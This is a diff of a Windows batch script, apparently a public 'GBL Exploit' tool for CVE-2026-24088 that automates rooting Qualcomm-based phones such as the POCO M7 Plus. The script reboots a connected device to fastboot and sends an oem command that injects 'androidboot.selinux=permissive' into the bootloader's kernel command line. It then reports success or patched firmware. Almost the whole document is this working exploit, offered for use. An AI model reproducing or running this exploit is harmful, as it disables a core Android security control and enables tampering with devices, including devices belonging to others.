@@ -1,10 +1,10 @@
 @echo off
 chcp 437 >nul 2>&1
-title GBL Exploit v2.5 - CVE-2026-24088 ^| github.com/aniketlab
+title GBL Exploit v2.0 - CVE-2026-24088 ^| github.com/aniketlab
 color 07
 mode con: cols=65 lines=45
 
-:: Permanent paths
+:: Permanent paths (never change)
 set "SCRIPT_DIR=%~dp0"
 if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
 set "TOOLS_DIR=%SCRIPT_DIR%\platform-tools"
@@ -13,14 +13,13 @@ set "FB_EXE=%TOOLS_DIR%\fastboot.exe"
 set "TOOLS_URL=https://dl.google.com/android/repository/platform-tools-latest-windows.zip"
 set "TOOLS_ZIP=%TEMP%\platform-tools.zip"
 set "TMPOUT=%TEMP%\gbl_out.txt"
-set "VERSION=2.5"
 
-:: Log file setup
+:: Log file path (timestamped, saved next to script)
 for /f "tokens=1-3 delims=/ " %%a in ("%DATE%") do set "LOGDATE=%%c%%a%%b"
 for /f "tokens=1-3 delims=:." %%a in ("%TIME: =0%") do set "LOGTIME=%%a%%b%%c"
 set "LOGFILE=%SCRIPT_DIR%\log_%LOGDATE%_%LOGTIME%.txt"
 
-:: -------------------------------------------------------
+:: --------------------------------------------------------
 :main_start
 setlocal EnableDelayedExpansion
 set "ADB=adb"
@@ -28,43 +27,34 @@ set "FASTBOOT=fastboot"
 set "MODEL="
 set "BRAND="
 set "BOARD="
-set "FIRMWARE="
-set "ANDROID="
-set "PATCH="
-set "BOOTSTATE="
 set "FAIL_REASON="
 set "MODE=ADB"
-set "DEVICE_SERIAL="
 
-call :log_init
 call :banner
 echo.
 echo  Starting automated exploit sequence...
 echo.
 timeout /t 1 /nobreak >nul
 
+call :log_init
+call :log_write "[START  ] Exploit session started."
+
 
 :: ============================================
-:: STEP 1 - ADB + PLATFORM TOOLS
+:: STEP 1 - ADB CHECK + AUTO DOWNLOAD
 :: ============================================
 echo  [1/6] Checking ADB / Platform Tools...
 echo.
 
 call :find_or_download_adb
 if errorlevel 1 (
-    echo.
-    echo  [X] Platform Tools setup failed.
-    echo      Check internet connection and try again.
-    goto :home_menu
+    call :log_write "[FAIL   ] ADB setup failed."
+    call :log_footer
+    goto :end_fail
 )
+call :log_write "[TOOLS  ] ADB      : !ADB!"
 
 echo.
-echo  -------------------------------------------------
-echo   [+] Platform Tools ready!
-echo       Proceeding to next step...
-echo  -------------------------------------------------
-echo.
-timeout /t 2 /nobreak >nul
 
 
 :: ============================================
@@ -75,91 +65,85 @@ echo.
 
 call :find_fastboot
 if errorlevel 1 (
-    echo.
-    echo  [X] Fastboot setup failed.
-    goto :home_menu
+    call :log_write "[FAIL   ] Fastboot setup failed."
+    call :log_footer
+    goto :end_fail
 )
+call :log_write "[TOOLS  ] Fastboot : !FASTBOOT!"
 
 echo.
-echo  -------------------------------------------------
-echo   [+] Fastboot ready!
-echo  -------------------------------------------------
-echo.
-timeout /t 1 /nobreak >nul
 
 
 :: ============================================
-:: STEP 3 - SMART DEVICE DETECTION
+:: STEP 3 - DEVICE DETECTION (wait loop)
 :: ============================================
 echo  [3/6] Scanning for connected devices...
 echo.
 
-call :detect_any_device
+call :wait_for_device
 if errorlevel 1 (
-    echo.
-    echo  [X] No device found. Connect phone and retry.
-    goto :home_menu
+    call :log_write "[FAIL   ] No device detected."
+    call :log_footer
+    goto :end_fail
 )
 
 echo.
 
 
 :: ============================================
-:: STEP 4 - PRE-FLIGHT COMPATIBILITY CHECK
-:: ============================================
-echo  [4/6] Pre-flight compatibility check...
-echo.
-
-call :preflight_check
-if errorlevel 1 goto :home_menu
-
-echo.
-
-
-:: ============================================
-:: STEP 5 - REBOOT TO FASTBOOT (skip if already there)
+:: STEP 4 - REBOOT TO FASTBOOT
 :: ============================================
 if "!MODE!"=="FASTBOOT" (
-    echo  [5/6] Device already in Fastboot mode.
+    echo  [4/6] Checking bootloader status...
+    timeout /t 1 /nobreak >nul
+    echo  [*] Oops, looks like someone is smart!
+    echo      You are already in fastboot mode haha! 
+    echo  [*] Skipping reboot...
     echo.
-    echo  -------------------------------------------------
-    echo   [+] Skipping reboot - already in bootloader.
-    echo  -------------------------------------------------
-    echo.
-    call :log_write "[5/6] Device already in Fastboot mode - skipped reboot."
-    call :check_fastboot_driver
-    echo.
+    timeout /t 2 /nobreak >nul
+    call :log_write "[REBOOT ] Device already in fastboot mode. Skipped."
 ) else (
-    echo  [5/6] Rebooting to Fastboot mode...
-    echo.
-    echo       Sending reboot command to phone...
+    echo  [4/6] Rebooting !MODEL! to fastboot mode...
     "%ADB%" -s %DEVICE_SERIAL% reboot bootloader >nul 2>&1
-    echo  [*]  Waiting for device to enter fastboot...
+    echo  [*] Waiting for fastboot...
     echo.
-    call :log_write "[5/6] Sent ADB reboot bootloader command."
+    call :log_write "[REBOOT ] ADB reboot bootloader sent."
 
     call :wait_for_fastboot
     if errorlevel 1 (
-        echo.
-        echo  [X] Device did not enter fastboot in time.
-        echo      Hold Volume Down + Power to manually enter fastboot.
-        goto :home_menu
+        call :log_write "[FAIL   ] Device did not enter fastboot in time."
+        call :log_footer
+        goto :end_fail
     )
-    call :check_fastboot_driver
     echo.
 )
 
 
 :: ============================================
-:: STEP 6 - EXPLOIT
+:: STEP 5 - EXPLOIT
 :: ============================================
-echo  [6/6] Running CVE-2026-24088 exploit...
+echo  [5/6] Testing CVE-2026-24088...
 echo.
-echo  Running:
+echo  Target Command:
 echo    fastboot oem set-gpu-preemption 0
 echo             androidboot.selinux=permissive
 echo.
-call :log_write "[6/6] Running exploit: fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive"
+echo  [*] Brace yourself! Firing exploit in...
+timeout /t 1 /nobreak >nul
+echo  5...
+timeout /t 1 /nobreak >nul
+echo  4...
+timeout /t 1 /nobreak >nul
+echo  3...
+timeout /t 1 /nobreak >nul
+echo  2...
+timeout /t 1 /nobreak >nul
+echo  1...
+timeout /t 1 /nobreak >nul
+echo  BOOM!
+echo.
+
+call :log_write "[EXPLOIT] fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive"
 
 "%FASTBOOT%" oem set-gpu-preemption 0 androidboot.selinux=permissive > "%TMPOUT%" 2>&1
 
@@ -168,18 +152,22 @@ echo  - - - - - - - - - - - - - - - - - - -
 type "%TMPOUT%"
 echo  - - - - - - - - - - - - - - - - - - -
 echo.
+
+:: Append raw fastboot response to log
+call :log_write "[RESP   ] --- Fastboot Response ---"
 type "%TMPOUT%" >> "%LOGFILE%" 2>nul
+call :log_write "[RESP   ] --- End Response ---"
 
 findstr /i "OKAY" "%TMPOUT%" >nul 2>&1
 if %errorlevel% equ 0 goto :success
 
 findstr /i "unknown command" "%TMPOUT%" >nul 2>&1
 if %errorlevel% equ 0 (
-    set "FAIL_REASON=Command unknown - device not affected by GBL exploit"
+    set "FAIL_REASON=Command unknown - device not a GBL-affected Qualcomm device"
     goto :not_supported
 )
 
-set "FAIL_REASON=Command rejected - firmware patched or device not vulnerable"
+set "FAIL_REASON=Command rejected - firmware is patched or device not affected"
 goto :not_supported
 
 
@@ -200,14 +188,10 @@ echo   SELinux : now PERMISSIVE
 echo.
 echo  =================================================
 echo.
-call :log_write "[RESULT] EXPLOIT SUCCESSFUL - SELinux set to PERMISSIVE"
-
-echo  [+] Sending boot continue command to phone...
+echo  [6/6] Continuing boot...
 "%FASTBOOT%" continue >nul 2>&1
-echo  [+] Device is booting now. Wait for it to fully boot.
+echo  [+] Device is booting now.
 echo.
-call :log_write "[INFO] fastboot continue sent. Device booting."
-
 echo  -------------------------------------------------
 echo   NEXT STEPS after phone fully boots:
 echo  -------------------------------------------------
@@ -224,13 +208,19 @@ echo  -------------------------------------------------
 echo.
 echo   github.com/aniketlab/POCO-M7-Plus-Jailbreak
 echo.
-echo  Log: %LOGFILE%
+
+call :log_write "[RESULT ] *** EXPLOIT SUCCESSFUL ***"
+call :log_write "[RESULT ] SELinux  : PERMISSIVE"
+call :log_write "[RESULT ] Device   : !MODEL! (!DEVICE_SERIAL!)"
+call :log_footer
+
+echo  Log saved:
+echo  %LOGFILE%
 echo.
 del "%TMPOUT%" >nul 2>&1
-echo  Press any key to go back to home menu...
+echo  Press any key to exit...
 pause >nul
-color 07
-goto :home_menu
+goto :done
 
 
 :: ============================================
@@ -242,7 +232,7 @@ cls
 echo.
 echo  =================================================
 echo.
-echo   RESULT: EXPLOIT FAILED / NOT SUPPORTED
+echo   RESULT: DEVICE NOT VULNERABLE / PATCHED
 echo.
 echo   Device  : !MODEL!
 echo   SoC     : !BOARD!
@@ -256,77 +246,69 @@ type "%TMPOUT%" 2>nul
 echo  - - - - - - - - - - - - -
 echo.
 echo  Possible reasons:
-echo   - Firmware already patched
+echo   - Firmware is already patched
 echo     (HyperOS 3.0.304.0+ for POCO M7 Plus)
 echo     (HyperOS 3.0.303.0+ for Redmi 15 5G)
-echo   - Device not affected by this ABL flaw
-echo     (Samsung, MediaTek, older Snapdragon etc.)
-echo   - ABL updated via security OTA
+echo   - Device model not affected by this ABL flaw
+echo     (older Snapdragon, Samsung, MediaTek etc.)
+echo   - ABL updated via a security OTA
 echo.
-call :log_write "[RESULT] EXPLOIT FAILED - !FAIL_REASON!"
-
-echo  [*] Rebooting device back to normal...
+echo  [*] Rebooting !MODEL! back to normal...
 "%FASTBOOT%" reboot >nul 2>&1
-echo  [+] Device is rebooting.
+echo  [+] Device rebooting.
 del "%TMPOUT%" >nul 2>&1
+
+call :log_write "[RESULT ] EXPLOIT FAILED"
+call :log_write "[RESULT ] Reason   : !FAIL_REASON!"
+call :log_write "[RESULT ] Device   : !MODEL! / !BOARD!"
+call :log_footer
+
 echo.
-echo  Log: %LOGFILE%
+echo  Log saved:
+echo  %LOGFILE%
 echo.
-echo  Press any key to go back to home menu...
+echo  Press any key to see options...
 pause >nul
-color 07
-goto :home_menu
+goto :retry_prompt
 
 
 :: ============================================
-:: HOME MENU
+:: RETRY PROMPT
 :: ============================================
-:home_menu
+:retry_prompt
 color 07
 echo.
 echo  -------------------------------------------------
 echo.
 echo   What do you want to do?
 echo.
-echo   [R] Run exploit again (from beginning)
-echo   [L] Loop Mode (auto re-apply after reboot)
-echo   [C] Clean up downloaded platform-tools
+echo   [R] Retry from beginning
+echo   [C] Clean up (delete downloaded tools)
 echo   [E] Exit
 echo.
 echo  -------------------------------------------------
-choice /c RLCE /n /m "  Your choice (R/L/C/E): "
+choice /c RCE /n /m "  Your choice (R/C/E): "
 echo.
 if %errorlevel% equ 1 (
     endlocal
     goto :main_start
 )
-if %errorlevel% equ 2 goto :loop_mode
-if %errorlevel% equ 3 goto :cleanup_action
+if %errorlevel% equ 2 goto :cleanup_action
 goto :done
 
 
 :: ============================================
-:: LOOP MODE
+:: END FAIL (no retry prompt, just show it)
 :: ============================================
-:loop_mode
+:end_fail
 echo.
-echo  [LOOP] Waiting for device to reboot and reconnect...
-echo         (Close this window anytime to stop loop mode)
-echo.
-call :log_write "[LOOP] Loop mode enabled."
-:loop_wait_disconnect
-"%ADB%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
-if !errorlevel! equ 0 (
-    timeout /t 3 /nobreak >nul
-    goto :loop_wait_disconnect
-)
-echo  [LOOP] Device rebooted. Waiting to reconnect...
-endlocal
-goto :main_start
+echo  Press any key to see options...
+pause >nul
+goto :retry_prompt
 
 
 :: ============================================
-:: CLEANUP
+:: CLEANUP - FORCE DELETE
 :: ============================================
 :cleanup_action
 color 07
@@ -339,7 +321,7 @@ if exist "%TOOLS_DIR%" (
     echo  [*] Deleting: %TOOLS_DIR%
     rd /s /q "%TOOLS_DIR%" >nul 2>&1
     if exist "%TOOLS_DIR%" (
-        echo  [X] Could not delete - close programs using it.
+        echo  [X] Could not delete - close any programs using it.
     ) else (
         echo  [+] Deleted successfully.
     )
@@ -348,19 +330,25 @@ if exist "%TOOLS_DIR%" (
 )
 echo.
 if exist "%TOOLS_ZIP%" (
+    echo  [*] Deleting leftover zip...
     del /f /q "%TOOLS_ZIP%" >nul 2>&1
-    echo  [+] Leftover zip deleted.
+    echo  [+] Zip deleted.
+) else (
+    echo  [i] No leftover zip. Already clean.
 )
 echo.
 echo  Cleanup done. Next run will re-download tools.
 echo.
-echo  Press any key to go back to home menu...
-pause >nul
-goto :home_menu
+choice /c RE /n /m "  (R) Retry  (E) Exit: "
+if %errorlevel% equ 1 (
+    endlocal
+    goto :main_start
+)
+goto :done
 
 
 :: ============================================
-:: DONE (Exit)
+:: DONE
 :: ============================================
 :done
 color 07
@@ -374,13 +362,30 @@ exit /b
 :: ============================================
 :log_init
 echo ====================================================== > "%LOGFILE%"
-echo  GBL-AutoRoot v%VERSION% Session Log >> "%LOGFILE%"
-echo  Date: %DATE%  %TIME% >> "%LOGFILE%"
+echo   GBL-AutoRoot v2.0  ^|  Session Log >> "%LOGFILE%"
+echo   CVE-2026-24088  ^|  github.com/aniketlab >> "%LOGFILE%"
 echo ====================================================== >> "%LOGFILE%"
+echo   Date : %DATE% >> "%LOGFILE%"
+echo   Time : %TIME% >> "%LOGFILE%"
+echo ====================================================== >> "%LOGFILE%"
+echo. >> "%LOGFILE%"
 exit /b
 
+:: ============================================
+:: SUB: LOG WRITE
+:: ============================================
 :log_write
-echo [%TIME%] %~1 >> "%LOGFILE%"
+echo [%TIME: =0%] %~1 >> "%LOGFILE%" 2>nul
+exit /b
+
+:: ============================================
+:: SUB: LOG FOOTER
+:: ============================================
+:log_footer
+echo. >> "%LOGFILE%"
+echo ====================================================== >> "%LOGFILE%"
+echo   Session ended : %TIME% >> "%LOGFILE%"
+echo ====================================================== >> "%LOGFILE%"
 exit /b
 
 
@@ -389,17 +394,7 @@ exit /b
 :: ============================================
 :find_or_download_adb
 
-:: 1. Check local folder first
-if exist "%ADB_EXE%" (
-    "%ADB_EXE%" version > "%TEMP%\adbver.txt" 2>&1
-    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do echo  [+] Local ADB: %%v
-    del "%TEMP%\adbver.txt" >nul 2>&1
-    set "ADB=%ADB_EXE%"
-    set "PATH=%TOOLS_DIR%;%PATH%"
-    exit /b 0
-)
-
-:: 2. Check system PATH
+:: 1. Check system PATH
 adb version >nul 2>&1
 if %errorlevel% equ 0 (
     adb version > "%TEMP%\adbver.txt" 2>&1
@@ -409,9 +404,23 @@ if %errorlevel% equ 0 (
     exit /b 0
 )
 
+:: 2. Check local folder
+if exist "%ADB_EXE%" (
+    "%ADB_EXE%" version > "%TEMP%\adbver.txt" 2>&1
+    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do echo  [+] Local ADB: %%v
+    del "%TEMP%\adbver.txt" >nul 2>&1
+    echo  [i] %ADB_EXE%
+    set "ADB=%ADB_EXE%"
+    set "PATH=%TOOLS_DIR%;%PATH%"
+    exit /b 0
+)
+
 :: 3. Download
-echo  [-] ADB not found. Downloading Platform Tools from Google...
-echo      Please wait, this may take a minute...
+echo  [-] ADB not found. Downloading from Google...
+echo.
+echo  URL  : %TOOLS_URL%
+echo  To   : %TOOLS_ZIP%
+echo  After: %TOOLS_DIR%
 echo.
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
@@ -450,18 +459,19 @@ if not exist "%TOOLS_ZIP%" (
     exit /b 1
 )
 
-echo  [*] Extracting Platform Tools...
+echo  [*] Extracting...
 powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
 del "%TOOLS_ZIP%" >nul 2>&1
 
 if not exist "%ADB_EXE%" (
-    echo  [X] Extraction failed. adb.exe not found.
+    echo  [X] Extraction failed. adb.exe not found after extract.
     exit /b 1
 )
 
 set "ADB=%ADB_EXE%"
 set "PATH=%TOOLS_DIR%;%PATH%"
-echo  [+] Platform Tools downloaded and extracted successfully!
+echo  [+] Platform Tools ready.
+echo  [i] %TOOLS_DIR%
 exit /b 0
 
 
@@ -470,6 +480,7 @@ exit /b 0
 :: ============================================
 :find_fastboot
 
+:: 1. Try local fastboot.exe (best case)
 if exist "%FB_EXE%" (
     "%FB_EXE%" --version > "%TEMP%\fbver.txt" 2>&1
     for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\fbver.txt"') do echo  [+] Local Fastboot: %%v
@@ -478,6 +489,7 @@ if exist "%FB_EXE%" (
     exit /b 0
 )
 
+:: 2. Try system PATH fastboot
 fastboot --version >nul 2>&1
 if %errorlevel% equ 0 (
     fastboot --version > "%TEMP%\fbver.txt" 2>&1
@@ -487,10 +499,17 @@ if %errorlevel% equ 0 (
     exit /b 0
 )
 
-:: Missing - re-download
-echo  [!] fastboot.exe missing. Re-downloading platform-tools...
+:: 3. fastboot.exe is missing - auto fix
+echo  [!] fastboot.exe missing from platform-tools.
+echo  [*] Fixing automatically (re-downloading)...
 echo.
-if exist "%TOOLS_DIR%" rd /s /q "%TOOLS_DIR%" >nul 2>&1
+
+if exist "%TOOLS_DIR%" (
+    rd /s /q "%TOOLS_DIR%" >nul 2>&1
+)
+
+echo  Downloading platform-tools from Google...
+echo.
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$ProgressPreference='SilentlyContinue';" ^
@@ -521,33 +540,38 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
     "Write-Host ''" ^
   "} catch { Write-Host ''; Write-Host ('  [X] ' + $_.Exception.Message) }"
 
+echo.
+
 if not exist "%TOOLS_ZIP%" (
-    echo  [X] Download failed.
+    echo  [X] Download failed. Check internet connection.
     exit /b 1
 )
 
+echo  [*] Extracting...
 powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
 del "%TOOLS_ZIP%" >nul 2>&1
 
 if not exist "%FB_EXE%" (
-    echo  [X] Still missing after re-download.
+    echo  [X] Still missing after re-download. Something went wrong.
     exit /b 1
 )
 
 set "ADB=%ADB_EXE%"
 set "FASTBOOT=%FB_EXE%"
 set "PATH=%TOOLS_DIR%;%PATH%"
-echo  [+] Platform Tools fixed and ready.
+echo  [+] Fixed. Full platform-tools now available.
 exit /b 0
 
 
 :: ============================================
-:: SUB: SMART DETECT - ADB or FASTBOOT
+:: SUB: WAIT FOR DEVICE (60s loop)
 :: ============================================
-:detect_any_device
+:wait_for_device
 set "DEVICE_FOUND=0"
+set "DEVICE_SERIAL="
+set "MODE=ADB"
 
-:: 1. Quick check ADB
+:: Quick check ADB
 for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
     if "%%b"=="device" (
         set "DEVICE_FOUND=1"
@@ -557,7 +581,7 @@ for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
 )
 if "!DEVICE_FOUND!"=="1" goto :device_collect_info
 
-:: 2. Quick check Fastboot
+:: Quick check Fastboot
 for /f "tokens=1" %%a in ('"%FASTBOOT%" devices 2^>nul') do (
     if not "%%a"=="" (
         set "DEVICE_FOUND=1"
@@ -567,18 +591,18 @@ for /f "tokens=1" %%a in ('"%FASTBOOT%" devices 2^>nul') do (
 )
 if "!DEVICE_FOUND!"=="1" goto :device_collect_fastboot
 
-:: 3. Wait loop - NO TIMEOUT, waits forever
 echo  [-] No device detected yet.
 echo.
 echo  Connect your phone via USB. Script auto-detects:
-echo    - Normal mode  (ADB / USB Debugging ON)
-echo    - Fastboot mode (already in bootloader)
+echo   - Normal mode  (ADB / USB Debugging ON)
+echo   - Fastboot mode (already in bootloader)
 echo.
-echo  Waiting... Tool will NOT close on its own. Take your time.
+echo  Waiting up to 60 seconds...
 <nul set /p ="  "
 
 set "WAIT=0"
-:detect_loop
+:device_loop
+if !WAIT! geq 30 goto :device_timeout
 timeout /t 2 /nobreak >nul
 set /a WAIT+=1
 <nul set /p ="."
@@ -610,41 +634,17 @@ if "!DEVICE_FOUND!"=="1" (
     goto :device_collect_fastboot
 )
 
-:: Every 60 seconds print reminder but keep waiting
-if !WAIT! geq 30 (
-    echo.
-    echo.
-    echo  [-] Still waiting... Tool will NOT close by itself.
-    echo      - USB cable connected?
-    echo      - USB Debugging ON in Developer Options?
-    echo      - Tap ALLOW on phone if popup appeared?
-    echo.
-    <nul set /p ="  "
-    set "WAIT=0"
-)
-goto :detect_loop
+goto :device_loop
 
+:device_timeout
+echo.
+echo.
+echo  [X] No device detected after 60 seconds.
+exit /b 1
 
 :device_collect_info
 echo.
-echo  [+] Device found via ADB!
-echo.
-echo      *** If USB Debugging popup appeared on phone ***
-echo      *** tap ALLOW now, then wait 10 seconds...   ***
-echo.
-<nul set /p ="  Waiting "
-set "W=0"
-:adb_allow_wait
-if !W! geq 10 goto :adb_allow_done
-timeout /t 1 /nobreak >nul
-set /a W+=1
-<nul set /p ="."
-goto :adb_allow_wait
-:adb_allow_done
-echo.
-echo.
-
-echo  [+] Reading device information...
+echo  [+] Reading device info...
 echo.
 for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.brand 2^>nul') do set "BRAND=%%i"
 for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.model 2^>nul') do set "MODEL=%%i"
@@ -652,8 +652,14 @@ for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.vers
 for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.security_patch 2^>nul') do set "PATCH=%%i"
 for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.board 2^>nul') do set "BOARD=%%i"
 for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.boot.verifiedbootstate 2^>nul') do set "BOOTSTATE=%%i"
-for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.incremental 2^>nul') do set "FIRMWARE=%%i"
-call :log_write "[DEVICE] Brand=!BRAND! Model=!MODEL! Android=!ANDROID! Patch=!PATCH! Board=!BOARD! Mode=ADB Firmware=!FIRMWARE!"
+
+call :log_write "[DEVICE ] Serial   : %DEVICE_SERIAL%"
+call :log_write "[DEVICE ] Brand    : !BRAND!"
+call :log_write "[DEVICE ] Model    : !MODEL!"
+call :log_write "[DEVICE ] Android  : !ANDROID!"
+call :log_write "[DEVICE ] Patch    : !PATCH!"
+call :log_write "[DEVICE ] Board    : !BOARD!"
+call :log_write "[DEVICE ] Boot     : !BOOTSTATE!"
 
 echo  -------------------------------------------------
 echo   Device Info
@@ -664,114 +670,38 @@ echo   Android       : !ANDROID!
 echo   Security Patch: !PATCH!
 echo   Board / SoC   : !BOARD!
 echo   Boot State    : !BOOTSTATE!
-echo   Firmware      : !FIRMWARE!
 echo   Serial        : %DEVICE_SERIAL%
 echo  -------------------------------------------------
+echo.
+echo  [i] Works on ANY Qualcomm ABL vulnerable device.
+echo      OKAY response = root granted. Anything
+echo      else = device not affected or patched.
 exit /b 0
 
 :device_collect_fastboot
 echo.
-echo  [+] Reading device info via Fastboot...
+echo  [+] Reading device info (Fastboot)...
 echo.
-set "BRAND=Unknown"
 set "MODEL=Unknown"
+set "BRAND=Unknown"
 set "BOARD=Unknown"
 for /f "tokens=2 delims= " %%i in ('"%FASTBOOT%" -s %DEVICE_SERIAL% getvar product 2^>^&1 ^| findstr "product:"') do set "MODEL=%%i"
-call :log_write "[DEVICE] Brand=!BRAND! Model=!MODEL! Mode=FASTBOOT Serial=!DEVICE_SERIAL!"
+
+call :log_write "[DEVICE ] Mode     : FASTBOOT"
+call :log_write "[DEVICE ] Serial   : %DEVICE_SERIAL%"
+call :log_write "[DEVICE ] Model    : !MODEL!"
 
 echo  -------------------------------------------------
 echo   Device Info
 echo  -------------------------------------------------
-echo   Model   : !MODEL!
-echo   Serial  : !DEVICE_SERIAL!
-echo   Mode    : FASTBOOT (already in bootloader)
+echo   Model         : !MODEL!
+echo   Serial        : %DEVICE_SERIAL%
+echo   Mode          : FASTBOOT
 echo  -------------------------------------------------
-exit /b 0
-
-
-:: ============================================
-:: SUB: PRE-FLIGHT COMPATIBILITY CHECK
-:: ============================================
-:preflight_check
-
-if "!MODE!"=="ADB" (
-    if "!BOOTSTATE!"=="green" (
-        echo  [PASS] Bootloader locked - confirmed ABL injection target.
-        call :log_write "[PREFLIGHT] Bootloader locked (green)."
-    ) else if "!BOOTSTATE!"=="orange" (
-        echo  [INFO] Bootloader is UNLOCKED (orange state).
-        call :log_write "[PREFLIGHT] Bootloader already unlocked."
-    ) else (
-        echo  [INFO] Boot state: !BOOTSTATE!
-    )
-    echo.
-    echo  [INFO] Firmware version: !FIRMWARE!
-    call :log_write "[PREFLIGHT] Firmware: !FIRMWARE!"
-    echo.
-)
-
-:: SoC compatibility check
-set "SOC_OK=0"
-if /i "!BOARD!"=="blair"    set "SOC_OK=1"
-if /i "!BOARD!"=="holi"     set "SOC_OK=1"
-if /i "!BOARD!"=="bengal"   set "SOC_OK=1"
-if /i "!BOARD!"=="khaje"    set "SOC_OK=1"
-
-if "!SOC_OK!"=="1" (
-    echo  [PASS] SoC [!BOARD!] - known vulnerable Qualcomm ABL target.
-    call :log_write "[PREFLIGHT] SoC OK: !BOARD!"
-    echo.
-) else (
-    echo  [WARN] SoC [!BOARD!] is not in the tested compatible list.
-    echo.
-    echo         This is a universal exploit tool - it may still
-    echo         work on other Qualcomm ABL devices. However,
-    echo         success is not guaranteed for this SoC.
-    echo.
-    call :log_write "[PREFLIGHT] WARN: Untested SoC: !BOARD!"
-    choice /c YN /n /m "  Continue anyway? (Y/N): "
-    if !errorlevel! equ 2 (
-        echo.
-        echo  [*] Aborted by user.
-        exit /b 1
-    )
-    echo.
-    echo  [*] Proceeding at your own risk...
-    echo.
-)
-
-exit /b 0
-
-
-:: ============================================
-:: SUB: CHECK FASTBOOT DRIVER
-:: ============================================
-:check_fastboot_driver
-echo  Checking fastboot USB driver...
 echo.
-
-"%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
-if %errorlevel% equ 0 (
-    echo  [PASS] Fastboot driver detected - device communicating OK.
-    call :log_write "[PREFLIGHT] Fastboot driver OK."
-) else (
-    echo  [WARN] Fastboot driver not detected!
-    echo.
-    echo         Windows cannot talk to the device in fastboot mode.
-    echo         You need to install Google USB Drivers.
-    echo.
-    echo         Download from:
-    echo         https://developer.android.com/studio/run/win-usb
-    echo.
-    echo         After installing driver, restart this tool.
-    echo.
-    call :log_write "[PREFLIGHT] WARN: Fastboot driver missing."
-    echo  Press any key to go back to home menu...
-    pause >nul
-    exit /b 1
-)
+echo  [i] Device is already in fastboot mode.
+echo      Ready to apply exploit.
 exit /b 0
-
 
 :: ============================================
 :: SUB: WAIT FOR FASTBOOT DEVICE (30s loop)
@@ -788,22 +718,24 @@ set /a FBWAIT+=1
 <nul set /p ="."
 
 "%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
-if !errorlevel! equ 0 goto :fb_found
+if !errorlevel! equ 0 (
+    set "FB_READY=1"
+    goto :fb_found
+)
 goto :fb_loop
 
 :fb_timeout
 echo.
 echo.
 echo  [X] Device did not enter fastboot within 30 seconds.
-call :log_write "[FASTBOOT] Timeout waiting for fastboot mode."
 exit /b 1
 
 :fb_found
 echo.
 echo.
-for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "DEVICE_SERIAL=%%i"
-echo  [+] Fastboot ready. Serial: !DEVICE_SERIAL!
-call :log_write "[FASTBOOT] Ready. Serial: !DEVICE_SERIAL!"
+for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "FB_SERIAL=%%i"
+echo  [+] Fastboot ready. Serial: !FB_SERIAL!
+call :log_write "[FASTBT ] Ready. Serial: !FB_SERIAL!"
 exit /b 0
 
 
@@ -814,7 +746,7 @@ exit /b 0
 cls
 echo.
 echo  =================================================
-echo   Qualcomm GBL Exploit v%VERSION% - CVE-2026-24088
+echo   Qualcomm GBL Exploit v2.0 - CVE-24088
 echo   Automated Root via ABL Cmdline Injection
 echo  -------------------------------------------------
 echo   Tested     : POCO M7 Plus 5G (SM6375)
